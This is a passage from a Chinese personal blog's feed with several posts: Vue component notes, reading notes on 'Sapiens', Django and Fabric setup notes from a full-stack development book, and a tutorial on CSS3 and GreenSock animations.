rel="noopener">文档的链接</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//父组件使用provide</span><br><span class="line">&lt;template&gt;  </span><br><span class="line">    &lt;div class=&quot;parent&quot;&gt;     </span><br><span class="line">         &lt;child-component&gt;&lt;/child-component&gt;   </span><br><span class="line">    &lt;/div&gt;  </span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;  </span><br><span class="line">    ......  </span><br><span class="line">    provide: &#123; parent: &quot;父组件的值&quot;&#125;,  </span><br><span class="line">    components:&#123;    child-component,  &#125;, </span><br><span class="line">     ......</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//此时可以在子组件通过这种方式获取父组件中“parent”的值：</span><br><span class="line">//子组件中</span><br><span class="line">export default &#123;  </span><br><span class="line">    mounted()&#123;      </span><br><span class="line">        console.log(this.parent); //&quot;父组件的值&quot;  </span><br><span class="line">    &#125;,  </span><br><span class="line">    inject: [&apos;parent&apos;],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="vue源码研读"><a href="#vue源码研读" class="headerlink" title="vue源码研读"></a>vue源码研读</h3><p><a href="https://juejin.im/post/5adff30f518825672d33d596" target="_blank" rel="noopener">手拉手带你过一遍vue部分源码</a></p><p><a href="https://juejin.im/post/5adf0085518825673123da9a" target="_blank" rel="noopener">当面试官问你Vue响应式原理，你可以这么回答他</a></p><p><a href="https://juejin.im/post/5ad10800f265da23826e681e" target="_blank" rel="noopener">如何解释vue的生命周期才能令面试官满意？</a></p><p>在使用.vue文件开发的过程当中，我们在里面写了template模板，在经过了vue-loader的处理之后，就变成了render function，最终放到了vue-loader解析过的文件里面。这样做有什么好处呢？原因是由于在解析template变成render function的过程，是一个非常耗时的过程，vue-loader帮我们处理了这些内容之后，当我们在页面上执行vue代码的时候，效率会变得更高。</p><p>Vue为我们提供了renderError方法，这个方法只有在开发的时候它才会被调用，在正式打包上线的过程当中，它是不会被调用的。它主要是帮助我们调试render里面的一些错误。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">renderError (h, err) &#123;</span><br><span class="line">  <span class="keyword">return</span> h(<span class="string">'div'</span>, &#123;&#125;, err.stack)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>有且只有当render方法里面报错了，才会执行renderError方法。<br>所以我们主动让render函数报个错：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">render (h) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'render error'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>还有一点，renderError只有在<code>本组件</code>的render方法报错的情况下它才会被调用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;实现QQ弹窗-和QQ号为qqnum聊天&quot;&gt;&lt;a href=&quot;#实现QQ弹窗-和QQ号为qqnum聊天&quot; class=&quot;headerlink&quot; title=&quot;实现QQ弹窗 和QQ号为qqnum聊天&quot;&gt;&lt;/a&gt;实现QQ弹窗 和QQ号为qqnum聊天&lt;/h3&gt;&lt;figu
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="每月总结" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E6%AF%8F%E6%9C%88%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>读《人类简史》</title>
    <link href="http://lry1994.github.io/life/2018-brief-history-of-humankind.html"/>
    <id>http://lry1994.github.io/life/2018-brief-history-of-humankind.html</id>
    <published>2018-03-24T16:00:00.000Z</published>
    <updated>2018-04-12T05:43:58.395Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/book/brief-history.png" alt="cover"></p><p>时间简史</p><p>大脑消耗能量惊人，大脑越来越大、发展成人类，但是肌肉退化萎缩。</p><p>人类直立行走让臀部变窄、产道宽度受限，婴儿头还越来越大，于是分娩成了大风险，自然选择让生产提前。</p><p>要养活孩子需要全部落共同努力，所以人类有突出的社交技巧</p><p>用火，让人与动物首次有了明显的不同。烹饪让人体肠道缩短、牙齿缩小，让大脑走上更大的道路</p><p>其他人种灭绝有两种理论，混种繁衍、替代理论</p><h3 id="认知革命—语言"><a href="#认知革命—语言" class="headerlink" title="认知革命—语言"></a>认知革命—语言</h3><p>智人征服世界，是因为某次偶然的基因突变，改变了智人脑部内部连接方式，有了独特的语言，这就是认知革命</p><p>人类的语言特别的地方在于最为灵活</p><p>八卦理论：语言发展为一种八卦的工具、社会合作是生存和繁衍的关键，智人发展出新的语言技能，让他们能够八卦数小时之久</p><p>人类语言最独特的功能在于，能够传达关于一些根本不存在的事物的信息，例如宗教，神话.<br>虚构的重点更重要的是可以 一起 想象，编织出共同的虚构故事，让智人得以灵活合作。智人的合作不仅灵活，还能和无数陌生人合作</p><p>在认知革命之后，虽然智人的基因和环境没什么改变，但智人还是能够迅速改变行为，并将新的行为方式传给下一代，这正是智人成功的关键</p><p>我们和黑猩猩的不同，是在超过150人的门槛之后才开始显现。人类和黑猩猩之间真正不同的地方就在于那些虚构的故事，它像胶水一样把千千万万的个人，家庭和群体结合在一起。这种胶水，让我们成为了万物的主宰</p><p>我们和远古人类的不同处就在于与大量陌生人合作，技术有了大幅提升</p><p>智人发明出了许许多多的想象现实，因而发展出许多行为模式，而这是“文化”的主要成分。等到文化出现，就再也无法停止改变和发展，这些无法阻挡的文化，就成了“历史”</p><p>我们的饮食习惯，冲突，性欲之所以是现在这样，是因为我们保留着狩猎采集者的头脑</p><p>远古的采集生活与后来的农业和工业生活相比，最明显的区别在于极少使用人造物品。因为采集者经常搬家，甚至每天都得搬，所有家当就背在身上。</p><p>远古采集者普遍信奉 泛神论</p><h3 id="农业革命"><a href="#农业革命" class="headerlink" title="农业革命"></a>农业革命</h3><p>农业革命让人类的食物总量暴增，反而造成人口爆炸，产生一群养尊处优娇生惯养的精英分子，农民的工作要比采集者更辛苦。</p><p>人类以为自己驯化了植物，但其实是植物驯化了智人</p><p>人类对一些事项无法达成协议就会冲突不断。这种灾难的根源在于，人类在几百万的演化过程中，一直都只是几十人的小部落，从农业革命之后，短短几千年就出现了城市王国，但时间并不足以让人类发展出能够大规模合作的本能</p><p>如果某个社会的人数和物品的数量超过某个临界值，就必定需要储存和处理大量的数字数据。人脑的限制大大局限了人类合作的规模和程度。因此就算在农业革命的数千年内，人类的社会网络还是相对规模较小，也相对简单。<br>最早克服这问题的是美索不达米亚平原的苏美尔人，发明了“书写文字”</p><p>随着越来越多的事情通过文字记载，数据检索变得非常复杂。为了让数据处理有效率准确和方便，需要一些工具来管理。考古发现了很多文字系统，但这些文字多半是新鲜但不实用的发明，原因在于这些文化没能找出方法来有效编目和检索数据。而苏美尔、古埃及、古中国、印加帝国的特殊之处，就在于这些文化都发展出了良好的技术，能够将文字予以归档、编目和检索，另外还投入资本培养人才来负责抄写、数据管理和会计事务。</p><p>历史告诉我们，每一种由想象建构出来的秩序，都不会承认自己是出于想象和虚构的，而会大谈自己是自然、必然的结果</p><p>但不幸的是，复杂的社会似乎就是需要这些由想象建构出来的阶级制度和歧视。人类要让社会有秩序的方法，就是把成员分成各种想象出来的阶级。有了阶级之后，陌生人不用浪费时间和精力真正了解彼此也能知道如何对待对方</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/book/brief-history.png&quot; alt=&quot;cover&quot;&gt;&lt;/p&gt;
&lt;p&gt;时间简史&lt;/p&gt;
&lt;p&gt;大脑消耗能量惊人，大脑越来越大、发展成人类，但是肌肉退化萎缩。&lt;/p&gt;
&lt;p&gt;人类直立行走让臀部变窄、产道宽度受限，婴儿头还越
      
    
    </summary>
    
      <category term="生活" scheme="http://lry1994.github.io/categories/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="阅读笔记" scheme="http://lry1994.github.io/categories/%E7%94%9F%E6%B4%BB/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="文学" scheme="http://lry1994.github.io/tags/%E6%96%87%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>《全栈应用开发精益实践》读书笔记</title>
    <link href="http://lry1994.github.io/study/2018/3/16-full-stack-develop-study.html"/>
    <id>http://lry1994.github.io/study/2018/3/16-full-stack-develop-study.html</id>
    <published>2018-03-16T05:38:38.000Z</published>
    <updated>2018-04-11T05:53:02.601Z</updated>
    
    <content type="html"><![CDATA[<p>这本书以前翻过几章，但是因为其他事情耽搁了，重新阅读已不太记得讲了什么，故重新阅读</p><h3 id="系统工具"><a href="#系统工具" class="headerlink" title="系统工具"></a>系统工具</h3><table><thead><tr><th>System</th><th style="text-align:left">包管理</th><th style="text-align:left">快速启动</th><th style="text-align:left">命令行</th></tr></thead><tbody><tr><td>window</td><td style="text-align:left">chocolatey</td><td style="text-align:left">wox</td><td style="text-align:left">cmder/Cygwin</td><td></td></tr><tr><td>GNU/Linux</td><td style="text-align:left">apt/yum/yast</td><td style="text-align:left">Launchy</td><td style="text-align:left">Zsh</td></tr><tr><td>Mac</td><td style="text-align:left">Homebrew</td><td style="text-align:left"></td><td style="text-align:left">iTerm2</td></tr></tbody></table><h3 id="回到顶部"><a href="#回到顶部" class="headerlink" title="回到顶部"></a>回到顶部</h3><p><code>&lt;a href=&quot;#&quot;&gt;回到顶部&lt;/a&gt;</code></p><h3 id="沟通"><a href="#沟通" class="headerlink" title="沟通"></a>沟通</h3><ul><li>每日站会。讲述昨天今天做了什么，遇到什么问题。</li><li>结对编程。两个人实现一个功能除了可以减少bug，还能分享。</li><li>代码审查</li><li>开卡和验收。开发人员和业务分析人员、测试人员一起开卡来进行新的任务，并在最后一起验收。</li><li>迭代回顾。</li></ul><h3 id="软件质量"><a href="#软件质量" class="headerlink" title="软件质量"></a>软件质量</h3><ul><li>测试驱动开发。先写测试，再实现代码，最后对代码进行重构。</li><li>重构。</li><li>技术债管理。由于发布临近，可能在这次发布里使用一些比较粗暴的方式来实现功能，代码不太吗。每当出现一点时就对问题进行标识，在适当的时候修复，若果所欠的债务越来越多，意味着软件的质量受到影响，需要重新审视这个问题。</li><li>浮现式设计。敏捷开发并不意味着架构设计不存在，在实践过程中依据问题改进代码。随着对软件质量的重视，我们的架构就会浮现出来。<h3 id="数据持久化"><a href="#数据持久化" class="headerlink" title="数据持久化"></a>数据持久化</h3></li><li>文件存储。<br>GoAcess/Hadoop/Spark.Logstash/ElasticSearch/Kibana</li><li>数据库<ul><li>关系数据库。MYSQL/SQLite3/PostgreSQL</li><li>非关系数据库。NoSQL/MongoDB/Redis/Cassandra</li></ul></li></ul><h3 id="UI框架。Foundation-Skeleton-Pure-css"><a href="#UI框架。Foundation-Skeleton-Pure-css" class="headerlink" title="UI框架。Foundation/Skeleton/Pure.css"></a>UI框架。Foundation/Skeleton/Pure.css</h3><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><ul><li>安装<br>  <code>pip install Django =1.10.2</code></li><li><p>创建项目<br>  <code>django-admin startproject project-name</code></p><p>文件结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- project-name</span><br><span class="line">    - __pycache__</span><br><span class="line">    - project-name</span><br><span class="line">        - __init__.py//指明这是一个Python模块</span><br><span class="line">        - settings.py //包含数据库环境、启用插件等的配置</span><br><span class="line">        - urls.py//指明了某个URL应该指向某个函数来处理</span><br><span class="line">        - wsgi.py//用于部署</span><br><span class="line">    - manage.py //可以和django-admin做类似的事情</span><br><span class="line">    - db.sqlite3</span><br></pre></td></tr></table></figure></li><li><p>启动服务器<br>  <code>python manage.py runserver</code></p><p>   打开 “<a href="http://localhost:8000/”" target="_blank" rel="noopener">http://localhost:8000/”</a></p><ul><li>下载SQLite3数据库 <a href="https://sqlite.org/download.html" target="_blank" rel="noopener">https://sqlite.org/download.html</a></li><li>数据库迁移<br>  <code>python manage.py migrate</code></li><li>创建超级用户来登录后台<br>  <code>python manage.py createsuperuser</code></li><li>登录后台-打开 “<a href="http://localhost:8000/admin”" target="_blank" rel="noopener">http://localhost:8000/admin”</a></li></ul></li></ul><h3 id="Fabric搭建构建系统"><a href="#Fabric搭建构建系统" class="headerlink" title="Fabric搭建构建系统"></a>Fabric搭建构建系统</h3><ul><li>安装<code>pip install fabric3</code></li><li>创建<code>fabfile.py</code>。执行  <code>fab 函数名:arg</code><br>fab命令从fabfile.py里面寻找对应的函数来执行</li><li><p>fabric有两种运行方式</p><ul><li><p>本地运行 <code>local函数</code></p><p>  需要<code>from fabric.api import local</code></p></li><li><p>在远程机器上执行命令</p></li></ul></li><li><p><code>fab --list</code> 会列出<code>fabfile.py</code>文件中所有有<code>@task</code>修饰器的方法</p><h3 id="代码风格监测"><a href="#代码风格监测" class="headerlink" title="代码风格监测"></a>代码风格监测</h3></li><li><p>pep8 </p><p>  安装<code>pip install pep8--1.7.0</code></p><p>  执行 <code>pep .</code></p></li><li><p>pylint</p><p>  安装 <code>pip install pylint</code>,再加入requirements.txt即可。</p><p>  有pylint-django插件</p></li><li><p>Flake8,他包装了</p><p>  静态检查<strong>PEP8</strong>风格的pep8,</p><p>  静态检查<strong>python代码逻辑错误</strong>的PyFlakes, </p><p>  静态分析<strong>pyhon代码复杂度</strong>的Ned Batchelder’sMcCabe script</p><h3 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h3></li></ul><p>在<code>project-name/project-name</code>目录下</p><p><code>django-admin startapp homepage</code></p><p>文件目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">- project-name          </span><br><span class="line">    - project-name</span><br><span class="line">        - __init__.py //指明这是一个Python模块</span><br><span class="line">        - settings.py //包含数据库环境、启用插件等的配置</span><br><span class="line">        - urls.py  //指明了某个URL应该指向某个函数来处理</span><br><span class="line">        - wsgi.py  //用于部署</span><br><span class="line">        - requirements</span><br><span class="line">            - dev.txt</span><br><span class="line">            - prod.txt</span><br><span class="line"></span><br><span class="line">    - homepage </span><br><span class="line">        - __init__.py</span><br><span class="line">        - admin.py</span><br><span class="line">        - apps.py</span><br><span class="line">        - models.py // 模型</span><br><span class="line">        - tests.py</span><br><span class="line">        - views.py //业务逻辑</span><br><span class="line">        - migratios</span><br><span class="line">            - __init__.py</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">    - templates</span><br><span class="line">    - static</span><br><span class="line"></span><br><span class="line">    - manage.py // 可以和django-admin做类似的事情</span><br><span class="line">    - fabfile.py // fab命令寻找的文件</span><br><span class="line">    - db.sqlite3</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这本书以前翻过几章，但是因为其他事情耽搁了，重新阅读已不太记得讲了什么，故重新阅读&lt;/p&gt;
&lt;h3 id=&quot;系统工具&quot;&gt;&lt;a href=&quot;#系统工具&quot; class=&quot;headerlink&quot; title=&quot;系统工具&quot;&gt;&lt;/a&gt;系统工具&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;

      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="读书笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>制作H5动画页面</title>
    <link href="http://lry1994.github.io/study/2018/3/6-H5.html"/>
    <id>http://lry1994.github.io/study/2018/3/6-H5.html</id>
    <published>2018-03-05T16:00:00.000Z</published>
    <updated>2018-04-11T05:52:57.221Z</updated>
    
    <content type="html"><![CDATA[<p>突然看到有H5页面外快做，看到微信朋友圈发的那些H5页面里面都用的了TweenMax，所以来研究一下，结果吓一跳，太太太强大了！！！！</p><h1 id="复习一下CSS3"><a href="#复习一下CSS3" class="headerlink" title="复习一下CSS3"></a>复习一下CSS3</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">background-size: width height</span><br><span class="line">background-clip:content-box/padding-box/border-box</span><br><span class="line">background-origin:content-box/padding-box/border-box</span><br><span class="line">background-image:url(bg_flower.gif),url(bg_flower_2.gif);多个背景</span><br><span class="line"></span><br><span class="line">text-shadow:水平阴影 垂直阴影 模糊距离 阴影的颜色</span><br><span class="line">box-shadow: 水平阴影 垂直阴影 模糊距离  阴影的尺寸 阴影的颜色</span><br><span class="line"></span><br><span class="line">clip: rect (top, right, bottom, left)</span><br><span class="line">&lt;top&gt;和&lt;bottom&gt;指定偏移量是从元素盒子顶部边缘算起；</span><br><span class="line">&lt;left&gt;和&lt;right&gt;指定的偏移量是从元素盒子左边边缘算起。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">word-wrap:break-word</span><br><span class="line">@font-face</span><br><span class="line"></span><br><span class="line">转换</span><br><span class="line">transform:translate()/rotate()/scale()/skew()/matrix()/rotateX()/rotateY()</span><br><span class="line"></span><br><span class="line">动画</span><br><span class="line">transition:transition-property transition-duration transition-timing-function transition-delay</span><br><span class="line">        @keyframes myfirst</span><br><span class="line">        &#123;</span><br><span class="line">        from &#123;background: red;&#125;</span><br><span class="line">        to &#123;background: yellow;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        animation: myfirst 5s;</span><br><span class="line"></span><br><span class="line">多列，这个只能平均分</span><br><span class="line">column-count</span><br><span class="line">column-gap</span><br><span class="line">column-rule</span><br><span class="line"></span><br><span class="line">resize:both 可以鼠标拖拽</span><br><span class="line">box-sizing:border-box;</span><br><span class="line"></span><br><span class="line">outline:2px solid red;</span><br><span class="line">outline-offset:15px;</span><br></pre></td></tr></table></figure><h1 id="GreenSock"><a href="#GreenSock" class="headerlink" title="GreenSock"></a>GreenSock</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>了解资料</p><p><a href="https://greensock.com/get-started-js#intro" target="_blank" rel="noopener">greensock get-started-js</a></p><p><a href="https://greensock.com/css3" target="_blank" rel="noopener">3D Transforms &amp; More CSS3 Goodies Arrive in GSAP JS</a></p><p>基础实例</p><p><a href="https://greensock.com/jump-start-js#welcome" target="_blank" rel="noopener">Jump Start: GSAP JS</a></p><p><a href="https://greensock.com/position-parameter" target="_blank" rel="noopener">Timeline Tip: Understanding the Position Parameter</a></p><p><a href="https://codepen.io/GreenSock/pen/qeHac" target="_blank" rel="noopener">Basic play / pause toggle button</a></p><p><a href="https://tympanus.net/codrops/2015/03/25/jump-loader-animation-svg-gsap/" target="_blank" rel="noopener">create a playful Jump Loader animation</a></p><p>进阶<br><a href="https://css-tricks.com/writing-smarter-animation-code/" target="_blank" rel="noopener">Writing Smarter Animation Code</a></p><p><a href="https://greensock.com/examples-showcases" target="_blank" rel="noopener">https://greensock.com/examples-showcases</a></p><p><a href="https://tympanus.net/codrops/" target="_blank" rel="noopener">https://tympanus.net/codrops/</a><br>隆重介绍这个网站，上面有好多好多好看的动画</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>GreenSock Animation Platform(GSAP)<br>是一套脚本动画工具。它包括：</p><blockquote><ul><li><code>TweenLite</code>: the core of the engine which handles animating just about any property of any object. It is relatively lightweight yet full-featured and can be expanded using optional plugins (like CSSPlugin for animating DOM element styles in the browser, or ScrollToPlugin scrolling to a specific location on a page or div, etc.)</li><li><code>TweenMax</code>: TweenLite’s beefy big brother; it does everything TweenLite can do plus non-essentials like repeat, yoyo, repeatDelay, etc. It includes many common plugins too like CSSPlugin so that you don’t need to load as many files. The focus is on being full-featured rather than lightweight.</li><li><code>TimelineLite</code>: a powerful, lightweight sequencing tool that acts like a container for tweens, making it simple to control them as a whole and precisely manage their timing in relation to each other. You can even nest timelines inside other timelines as deeply as you want. This allows you to modularize your animation workflow easily.</li><li><code>TimelineMax</code>: extends TimelineLite, offering exactly the same functionality plus useful (but non-essential) features like repeat, repeatDelay, yoyo, currentLabel(), and many more. Again, just like TweenMax does for TweenLite, TimelineMax aims to be the ultimate full-featured tool rather than lightweight.</li><li>Extras like easing tools, plugins, utilities like Draggable, and more</li></ul></blockquote><h2 id="TweenLite-可以解决基础动画"><a href="#TweenLite-可以解决基础动画" class="headerlink" title="TweenLite 可以解决基础动画"></a><code>TweenLite</code> 可以解决基础动画</h2><h3 id="动画曲线"><a href="#动画曲线" class="headerlink" title="动画曲线"></a>动画曲线</h3><p>Lightweight TweenLite: Power0, Power1, Power2, Power3, Power4, Linear, Quad, Cubic, Quart, Quint, and Strong </p><p>EasePack : Elastic, SlowMo, Bounce, SteppedEase, Sine, Circ, and Expo<a href="https://greensock.com/ease-visualizer" target="_blank" rel="noopener">https://greensock.com/ease-visualizer</a></p><h3 id="2D转换"><a href="#2D转换" class="headerlink" title="2D转换"></a>2D转换</h3><pre><code>rotation, scaleX,scaleY,scale, skewX, skewY,x, (相当于css的translateX)y, (相当于css的translateY)xPercent, yPercent</code></pre><ul><li>you could set <code>xPercent</code> and <code>yPercent</code> to <code>-50</code> and <code>position:&quot;absolute&quot;</code> so that everything starts with their centers in the same spot</li><li>IE6, IE7, and IE8 transforms don’t apply to child elements (that’s a browser limitation).</li></ul><h3 id="3D转换"><a href="#3D转换" class="headerlink" title="3D转换"></a>3D转换</h3><pre><code>rotationX, rotationY, rotationZ (identical to regular &quot;rotation&quot;), z,(相当于css的translateZ)perspective,transformPerspective</code></pre><ul><li><p>To get your elements to have a true 3D visual perspective applied, you must either set the <code>&quot;perspective&quot;</code> property of the parent element or set the special <code>&quot;transformPerspective&quot;</code> of the element itself (common values range from around 200 to 1000, the lower the number the stronger the perspective distortion)</p>  <blockquote><p>perspective distortion透视变形指的是一个物体及其周围区域与标准镜头中看到的相比完全不同，由于远近特征的相对比例变化，发生了弯曲或变形。</p></blockquote></li></ul><h3 id="重要属性"><a href="#重要属性" class="headerlink" title="重要属性"></a>重要属性</h3><ul><li><p>transformOrigin </p><ul><li>Sets the origin around which all transforms occur. By default, it is in the center of the element (“50% 50%”).</li></ul></li><li><p>directionalRotation</p><ul><li>_cw, _ccw , _short</li></ul></li><li><p>autoAlpha</p></li><li><p>className</p></li><li><p>autoRound<br>  By default, CSSPlugin will round pixel values and zIndex to the closest integer during the tween<br>  if you’d rather disable that behavior, pass autoRound:false<br>  You can still use the RoundPropsPlugin to manually define properties that you want rounded.</p></li><li><p>immediateRender :默认值true,在 from(), fromTo(), staggerFrom() and staggerFromTo() 方法中用</p></li><li><p>force3D :默认false</p><h3 id="Controlling-tween"><a href="#Controlling-tween" class="headerlink" title="Controlling tween"></a>Controlling tween</h3><p>  tween.pause();</p><pre><code>tl.pause() // pauses the animationtl.paused() // gets paused state, returns true or falsetl.paused(true) // sets paused state to truetl.paused(!tl.paused()) // sets paused state to inverse of current paused state.</code></pre><p>  tween.resume();<br>  tween.reverse();<br>  tween.seek(0.5);<br>  tween.timeScale(0.5);<br>  tween.timeScale(2);<br>  tween.kill();</p><p>  TweenLite.killTweensOf(myElement);</p></li></ul><h2 id="TimelineLite-让动画有序和组织"><a href="#TimelineLite-让动画有序和组织" class="headerlink" title="TimelineLite 让动画有序和组织"></a><code>TimelineLite</code> 让动画有序和组织</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//create a TimelineLite instance</span></span><br><span class="line"><span class="keyword">var</span> tl = <span class="keyword">new</span> TimelineLite();</span><br><span class="line"></span><br><span class="line"><span class="comment">//append a to() tween</span></span><br><span class="line">tl.to(element, <span class="number">1</span>, &#123;<span class="attr">width</span>:<span class="string">"50%"</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//add another sequenced tween (by default, tweens are added to the end of the timeline which makes sequencing simple)</span></span><br><span class="line">tl.to(element, <span class="number">1</span>, &#123;<span class="attr">height</span>:<span class="string">"300px"</span>, <span class="attr">ease</span>:Elastic.easeOut&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//offset the next tween by 0.75 seconds so there's a gap between the end of the previous tween and this new one</span></span><br><span class="line">tl.to(element, <span class="number">1</span>, &#123;<span class="attr">opacity</span>:<span class="number">0.5</span>&#125;, <span class="string">"+=0.75"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//overlap the next tween with the previous one by 0.5 seconds (notice the negative offset at the end)</span></span><br><span class="line">tl.to(element, <span class="number">1</span>, &#123;<span class="attr">backgroundColor</span>:<span class="string">"#FF0000"</span>&#125;, <span class="string">"-=0.5"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//animate 3 elements (e1, e2, and e3) to a rotation of 60 degrees, and stagger their start times by 0.2 seconds</span></span><br><span class="line">tl.staggerTo([e1, e2, e3], <span class="number">1</span>, &#123;<span class="attr">rotation</span>:<span class="number">60</span>&#125;, <span class="number">0.2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//then call myFunction()</span></span><br><span class="line">tl.call(myFunction);</span><br><span class="line"></span><br><span class="line"><span class="comment">//now we can control the entire sequence with the standard methods like these:</span></span><br><span class="line">tl.pause();</span><br><span class="line">tl.resume();</span><br><span class="line">tl.restart();</span><br><span class="line">tl.reverse();</span><br><span class="line">tl.play();</span><br><span class="line"></span><br><span class="line"><span class="comment">//jump to exactly 2.5 seconds into the animation</span></span><br><span class="line">tl.seek(<span class="number">2.5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//slow down playback to 10% of the normal speed</span></span><br><span class="line">tl.timeScale(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//add a label named "myLabel" at exactly 3 seconds:</span></span><br><span class="line">tl.add(<span class="string">"myLabel"</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//add a tween that starts at "myLabel"</span></span><br><span class="line">tl.add( TweenLite.to(element, <span class="number">1</span>, &#123;<span class="attr">scale</span>:<span class="number">0.5</span>&#125;), <span class="string">"myLabel"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//jump to "myLabel" and play from there:</span></span><br><span class="line">tl.play(<span class="string">"myLabel"</span>);</span><br></pre></td></tr></table></figure><h2 id="TimelineMax和TweenMax-多一些功能"><a href="#TimelineMax和TweenMax-多一些功能" class="headerlink" title="TimelineMax和TweenMax 